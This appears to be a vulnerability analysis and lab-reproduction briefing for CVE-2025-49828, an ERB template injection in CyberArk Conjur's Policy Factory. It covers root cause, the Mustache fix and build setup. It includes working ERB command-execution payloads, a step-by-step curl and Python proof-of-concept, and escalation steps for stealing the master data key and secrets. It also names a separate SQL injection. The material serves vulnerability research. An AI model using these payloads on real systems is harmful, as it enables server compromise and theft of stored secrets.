# Vulnerability Analysis: CVE-2025-49828

## Root Cause

**Server-Side Template Injection (SSTI) via Ruby ERB in CyberArk Conjur Policy Factory Renderer**

The `Factories::Renderer` class (`app/domain/factories/renderer.rb`, lines 5-12) uses Ruby's ERB (Embedded Ruby) template engine to render Policy Factory templates. ERB is a full-featured templating system that permits arbitrary Ruby code execution within `<%= %>` tags. The template content originates from Base64-encoded JSON stored in Conjur variables (database secrets) and is passed directly to `ERB.new(template, trim_mode: '-').result_with_hash(variables)` without any sanitization or sandboxing.

An attacker who can write to a factory template variable in Conjur can embed arbitrary Ruby code in the `policy` or `policy_branch` fields of the factory definition. When any user invokes the factory via the `/factory-resources` API endpoint, the ERB engine evaluates the template — including the injected code — within the Conjur server process, achieving Remote Code Execution (RCE).

The critical code path:

```ruby
# app/domain/factories/renderer.rb (VULNERABLE - v1.21.1)
module Factories
  class Renderer
    def initialize(render_engine: ERB)       # Line 5: ERB is the default engine
      @render_engine = render_engine
    end

    def render(template:, variables:)
      @success.new(
        @render_engine.new(template, trim_mode: '-').result_with_hash(variables)  # Line 12: SSTI
      )
    end
  end
end
```

The `filter_input` method in `Factories::Utilities` only sanitizes **user-supplied request body variables** (the values submitted when creating a resource), NOT the template string itself. The template comes directly from the database without any filtering:

```ruby
# app/domain/factories/utilities.rb
def self.filter_input(str)
  regex = Regexp.new('[^0-9a-z,\-_\/]', Regexp::IGNORECASE)
  str.gsub(regex, '')    # Only applied to request body params, NOT templates
end
```

## Vulnerable File(s) and Function(s)

| File | Function | Lines | Role |
|------|----------|-------|------|
| `app/domain/factories/renderer.rb` | `Factories::Renderer#render` | 11-12 | **Primary vulnerability** — calls `ERB.new(template).result_with_hash(variables)` |
| `app/domain/factories/renderer.rb` | `Factories::Renderer#initialize` | 5 | Sets ERB as default render engine |
| `app/domain/factories/create_from_policy_factory.rb` | `Factories::CreateFromPolicyFactory#call` | 22 | Renders `policy_branch` template via ERB |
| `app/domain/factories/create_from_policy_factory.rb` | `Factories::CreateFromPolicyFactory#call` | 38 (hardcoded `"<%= id %>"`) | Hardcoded ERB variables path template |
| `app/domain/factories/create_from_policy_factory.rb` | `Factories::CreateFromPolicyFactory#call` | 41 | Renders variables path via ERB |
| `app/domain/factories/create_from_policy_factory.rb` | `Factories::CreateFromPolicyFactory#render_and_apply_policy` | 94-96 | Renders the main `policy` template via ERB |
| `app/db/repository/policy_factory_repository.rb` | `PolicyFactoryRepository#convert_to_data_object` | 113-128 | Decodes factory from Base64 JSON without validation |
| `app/controllers/policy_factory_resources_controller.rb` | `PolicyFactoryResourcesController#create` | 37-59 | HTTP entry point for POST/PATCH that triggers rendering |
| `app/domain/factories/utilities.rb` | `Factories::Utilities.filter_input` | 7-9 | Filters request body values but NOT templates |

## Triggering Input

### Factory Template Payload

The attacker creates a malicious factory template containing ERB code injection. The template is a Base64-encoded JSON blob stored as a Conjur variable secret:

```json
{
  "version": "v1",
  "policy": "<Base64-encoded malicious ERB template>",
  "policy_branch": "<%= branch %>",
  "schema": {
    "$schema": "http://json-schema.org/draft-06/schema#",
    "title": "Malicious Factory",
    "type": "object",
    "properties": {
      "id": { "type": "string" },
      "branch": { "type": "string" }
    },
    "required": ["branch", "id"]
  }
}
```

The `policy` field before Base64-encoding contains the SSTI payload, for example:

```erb
<%= system('id > /tmp/pwned') %>
- !policy
  id: <%= id %>
```

Or using Ruby backtick execution:

```erb
<%= `id` %>
- !policy
  id: <%= id %>
```

The entire JSON blob is then Base64-encoded and stored as the value of a Conjur variable at path `conjur/factories/{kind}/{version}/{name}`.

### Trigger Request

The rendering is triggered by a POST or PATCH to the factory-resources endpoint:

```
POST /factory-resources/{account}/{kind}/(version)/{id}
Authorization: Token token="<base64-encoded-slosilo-JWT>"
Content-Type: application/json

{"id": "test", "branch": "root"}
```

Both `policy` and `policy_branch` fields are rendered through the ERB engine. The `policy_branch` field can also contain a payload directly (it is NOT base64-encoded within the factory JSON, unlike `policy`).

## Attack Scenario

### Prerequisites
- Authenticated Conjur user with:
  1. Permission to **update** (write) a factory variable at `conjur/factories/{kind}/{version}/{name}` — OR —
  2. Permission to **load policy** that creates a new factory variable and then set its secret value
  3. Permission to **execute** the factory variable (needed to invoke it)

### Step-by-Step Attack

1. **Authenticate to Conjur:**
   ```bash
   # Get API key (if using password)
   API_KEY=$(curl -s --user admin:ADmin123!!!! http://conjur:3000/authn/cucumber/login)
   
   # Exchange API key for access token
   TOKEN=$(curl -s -X POST http://conjur:3000/authn/cucumber/admin/authenticate \
     -d "$API_KEY" | base64 | tr -d '\n')
   ```

2. **Load factory infrastructure policy** (create the variable resources):
   ```bash
   curl -X POST "http://conjur:3000/policies/cucumber/policy/root" \
     -H "Authorization: Token token=\"$TOKEN\"" \
     -d '
   - !policy
     id: conjur
     body:
     - !policy
       id: factories
       body:
       - !policy
         id: core
         body:
         - !variable v1/evil
   '
   ```

3. **Create and store the malicious factory template:**
   ```python
   import base64, json
   
   # ERB SSTI payload: executes system command
   malicious_policy = base64.b64encode(
       b"<%= system('id > /tmp/pwned && cat /etc/hostname >> /tmp/pwned') %>\n- !policy\n  id: <%= id %>"
   ).decode()
   
   factory = {
       "version": "v1",
       "policy": malicious_policy,
       "policy_branch": "<%= branch %>",
       "schema": {
           "$schema": "http://json-schema.org/draft-06/schema#",
           "title": "Evil Factory",
           "type": "object",
           "properties": {
               "id": {"type": "string"},
               "branch": {"type": "string"}
           },
           "required": ["branch", "id"]
       }
   }
   
   encoded_factory = base64.b64encode(json.dumps(factory).encode()).decode()
   ```

4. **Store the factory template in the Conjur variable:**
   ```bash
   curl -X POST "http://conjur:3000/secrets/cucumber/variable/conjur%2Ffactories%2Fcore%2Fv1%2Fevil" \
     -H "Authorization: Token token=\"$TOKEN\"" \
     -d "$ENCODED_FACTORY"
   ```

5. **Trigger the factory rendering (RCE):**
   ```bash
   curl -X POST "http://conjur:3000/factory-resources/cucumber/core/v1/evil" \
     -H "Authorization: Token token=\"$TOKEN\"" \
     -H "Content-Type: application/json" \
     -d '{"id": "test", "branch": "root"}'
   ```

6. **Verify RCE:**
   ```bash
   docker exec conjur cat /tmp/pwned
   ```

### Alternative: SSTI via `policy_branch` Field

The `policy_branch` field is rendered first (line 22 of `create_from_policy_factory.rb`) and is NOT base64-encoded. A payload can be placed directly:

```json
{
  "version": "v1",
  "policy": "<base64 of normal policy>",
  "policy_branch": "<%= system('id > /tmp/pwned2') || branch %>",
  "schema": { ... }
}
```

This is a simpler vector because `policy_branch` doesn't require a double-base64 encoding step.

## Impact

- **Remote Code Execution (RCE)** — Arbitrary Ruby code and system commands execute within the Conjur server process
- **Full Server Compromise** — The Conjur server typically runs with elevated privileges and has access to all stored secrets (encryption keys, API keys, database credentials, certificates)
- **Secret Exfiltration** — Attacker can access `CONJUR_DATA_KEY` (the master encryption key) and decrypt all secrets in the database
- **Lateral Movement** — Stored credentials (database passwords, SSL keys, API tokens) can be used to compromise connected systems
- **Persistence** — Attacker can create backdoor accounts, modify policies, or inject additional malicious factory templates

**CVSS 3.1**: 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Authentication Requirements

### Authentication Flow for PoC

Conjur uses a two-step authentication process:

1. **Login** (exchange password for API key):
   ```
   GET /authn/{account}/login
   Authorization: Basic <base64(username:password)>
   → Returns: API key (plain text)
   ```

2. **Authenticate** (exchange API key for access token):
   ```
   POST /authn/{account}/{login}/authenticate
   Body: <API key as raw text>
   → Returns: Slosilo-signed JWT token (JSON)
   ```

3. **Use token** on subsequent requests:
   ```
   Authorization: Token token="<base64-encoded token JSON>"
   ```

### Default Credentials

| Setting | Value |
|---------|-------|
| Account | `cucumber` |
| Admin user | `admin` |
| Admin password | `ADmin123!!!!` |
| Alternative | Use `conjurctl account create cucumber` output (prints API key) |

### Alternative: Direct API Key Authentication

If using `conjurctl server -a cucumber`, the admin API key is printed to stdout. This can be used directly in step 2 (skip step 1).

### Permission Requirements

The attacker needs an authenticated role with:
- **`update`** permission on a `conjur/factories/{kind}/{version}/{name}` variable — to write the malicious template
- **`execute`** permission on the same variable — to invoke the factory

The admin role has both permissions by default. Non-admin users would need these permissions explicitly granted via policy.

## Fix Assessment

The fix in commit `b3c19593` is **thorough and complete** for the primary vulnerability. It:

1. **Replaces ERB with Mustache** (`mustache` gem v1.1.1) — Mustache is a logic-less template engine that supports only variable interpolation (`{{ }}`) and basic section blocks (`{{# }}` / `{{/ }}`). It does NOT support arbitrary code execution.

2. **Adds syntax validation** — After rendering, checks for unclosed `}}` tags that could indicate template injection attempts:
   ```ruby
   return @success.new(response) unless response.match(/\}\}/)
   @failure.new('Template includes invalid syntax')
   ```

3. **Adds error handling** for `Mustache::Parser::SyntaxError`.

4. **Updates all template syntax** — Changes `<%= variable %>` to `{{ variable }}` in all factory templates (including the hardcoded `variables_path` in `create_from_policy_factory.rb` line 38).

5. **Adds `transform_variables` method** — Converts Ruby hash structures to Mustache-compatible format.

The fix addresses the root cause (using a code-evaluating template engine) by replacing it with a logic-less engine. Even if an attacker stores ERB syntax (`<%= system('cmd') %>`) in a factory template, Mustache will not execute it — it will either treat it as literal text or fail with a syntax error.

### Fix Completeness Notes

- The `filter_input` on request body params remains as defense-in-depth but is no longer the primary protection.
- The post-render check for `}}` is an extra safety net against template syntax anomalies.
- No other code paths use ERB for factory template rendering.
- The `ERB::Util.url_encode` calls elsewhere in the codebase (OIDC authenticator) are purely utility functions and are unrelated to this vulnerability.

## Potential Bypass Vectors

None identified for the primary fix. The Mustache template engine fundamentally cannot execute arbitrary code. There is no way to inject code through Mustache's `{{ }}` syntax that would achieve code execution.

## Escalation Path

The SSTI primitive directly achieves **Remote Code Execution** — this is already the highest-impact outcome. Within the RCE context:

1. **Access `CONJUR_DATA_KEY`** from environment variables → decrypt all Conjur secrets
2. **Access the PostgreSQL database** directly via `DATABASE_URL` env var → read/modify all policies, secrets, and roles
3. **Create admin-level API keys** via `conjurctl` or direct database manipulation → persistent access
4. **Exfiltrate stored secrets** (database credentials, SSL certificates, API keys stored by other services)

## Related Attack Surface

### Finding 1: Both POST and PATCH trigger the same vulnerable code path
**File:** `config/routes.rb` line 68, `app/controllers/policy_factory_resources_controller.rb` lines 37-55

```ruby
match "/factory-resources/:account/:kind/(:version)/:id" => "policy_factory_resources#create", via: [:post, :patch]
```

Both HTTP methods route to the same `create` action → same `CreateFromPolicyFactory` → same `Renderer.render()`. PATCH requests are equally vulnerable.

### Finding 2: Three separate renderer invocations per factory request
**File:** `app/domain/factories/create_from_policy_factory.rb`

The renderer is called three times per factory invocation:
1. **Line 22** — Renders `policy_branch` template (attacker-controlled)
2. **Line 41** — Renders variables path (contains hardcoded `"<%= id %>"`)
3. **Line 94-96** — Renders the main `policy` template (attacker-controlled)

Each is an independent SSTI vector. The `policy_branch` field is the simplest to exploit (no double-base64 encoding).

### Finding 3: Commented-out direct ERB usage in Rake task
**File:** `lib/tasks/policy_factory.rake` line 18

```ruby
# puts(ERB.new(@factory.policy_template, nil, '-').result_with_hash(args))
```

Dead code (commented out) that confirms ERB was used directly before being refactored into the Renderer class. Not exploitable.

### Finding 4: SQL injection in PostgreSQL password rotation (separate vulnerability)
**File:** `app/domain/rotation/rotators/postgresql/password.rb` line 111

```ruby
def update_password(new_pw)
  username = @credentials.username
  conn = connection
  conn.exec("ALTER ROLE #{username} WITH PASSWORD '#{new_pw}'")
end
```

Direct string interpolation into SQL. Not directly related to CVE-2025-49828 but represents additional attack surface if an attacker can control the `username` Conjur variable.

## Build System

| Field | Value |
|-------|-------|
| **Language** | Ruby 3.0 |
| **Framework** | Ruby on Rails 6.1.7.8 |
| **Build System** | Bundler 2.4.14 |
| **Web Server** | Puma 6.4.2 |
| **Database** | PostgreSQL 15 (via `pg` gem 1.5.3, `sequel` ORM) |
| **Container Runtime** | Docker with Compose |

## Build Commands

### Production Build
```bash
docker build -t conjur:v1.21.1 -f Dockerfile .
```

### Dev Build (recommended for lab)
```bash
docker build -t conjur-dev -f dev/Dockerfile.dev .
```

### Using docker compose (recommended)
```bash
# Generate data encryption key
export CONJUR_DATA_KEY=$(docker run --rm conjur:v1.21.1 data-key generate)

# Start services
cd dev/
docker compose up -d pg conjur

# Wait for Conjur to start, then create account
docker compose exec conjur conjurctl account create cucumber
# → Prints admin API key to stdout
```

### Minimal Lab Setup (PoC agent should use this)
The lab needs only two services: PostgreSQL 15 and the Conjur application.

```yaml
# Minimal docker-compose.yml for lab
services:
  pg:
    image: postgres:15
    environment:
      POSTGRES_HOST_AUTH_METHOD: trust
    
  conjur:
    build:
      context: .
      dockerfile: dev/Dockerfile.dev
    environment:
      DATABASE_URL: postgres://postgres@pg/postgres
      CONJUR_ADMIN_PASSWORD: ADmin123!!!!
      CONJUR_ACCOUNT: cucumber
      CONJUR_DATA_KEY: ${CONJUR_DATA_KEY}
      RAILS_ENV: development
      CONJUR_LOG_LEVEL: debug
    ports:
      - "3000:3000"
    depends_on:
      - pg
```

### Server Initialization Sequence
1. Start PostgreSQL
2. Start Conjur container
3. Run `conjurctl server -a cucumber` inside the container (performs DB migration + account creation + starts Rails server on port 3000)
4. The server prints the admin API key — capture it for use in the PoC

Alternatively, for more control:
1. `conjurctl db migrate` — run DB migrations
2. `conjurctl account create cucumber` — create the account (prints API key)
3. `rails server -p 3000 -b 0.0.0.0` — start the web server

## Dependencies

### Build Dependencies
- Ruby 3.0 runtime (from `cyberark/ubuntu-ruby-builder:latest` base image)
- Bundler 2.4.14
- C compiler (for native gem extensions: `pg`, `nokogiri`, etc.)
- PostgreSQL client libraries (`libpq-dev`)
- Local gems: `gems/policy-parser/`, `gems/conjur-rack/`

### Runtime Dependencies
- PostgreSQL 15 (primary database, with trust authentication for dev)
- No other external services required for the factory vulnerability

### Key Gem Dependencies
- `rails` ~> 6.1 (web framework)
- `pg` (PostgreSQL adapter)
- `sequel` / `sequel-rails` (ORM, used alongside ActiveRecord)
- `puma` ~> 6 (application server)
- `json_schemer` (JSON Schema validation for factory request bodies)
- `slosilo` ~> 3.0 (CyberArk crypto library for token signing/verification)
- `conjur-policy-parser` (local gem for YAML policy parsing)
- `conjur-rack` (local gem for Rack middleware authentication)

## Runtime Requirements

### Environment Variables
| Variable | Value | Purpose |
|----------|-------|---------|
| `DATABASE_URL` | `postgres://postgres@pg/postgres` | PostgreSQL connection string |
| `CONJUR_DATA_KEY` | Generated via `conjurctl data-key generate` | 256-bit AES key for encrypting secrets in DB |
| `CONJUR_ACCOUNT` | `cucumber` | Conjur organization account name |
| `CONJUR_ADMIN_PASSWORD` | `ADmin123!!!!` | Initial admin password (set during account creation) |
| `RAILS_ENV` | `development` | Rails environment (use development for dev Dockerfile) |
| `CONJUR_LOG_LEVEL` | `debug` | Logging verbosity |

### Network
- Conjur listens on port **3000** (dev) or **80** (production)
- PostgreSQL on port **5432** (internal, container-to-container)

### Base Image Recommendation
- **Builder stage**: `cyberark/ubuntu-ruby-builder:latest` (has Ruby, Bundler, build tools)
- **Runtime stage**: `cyberark/ubuntu-ruby-postgres-fips:latest` (has Ruby runtime + PostgreSQL client, for dev) or `cyberark/ubuntu-ruby-fips:latest` (production, no pg client)
- **Alternative**: Use the existing `dev/Dockerfile.dev` which handles all dependencies

### Docker Socket
Not required. The lab only needs the Conjur application and PostgreSQL containers.
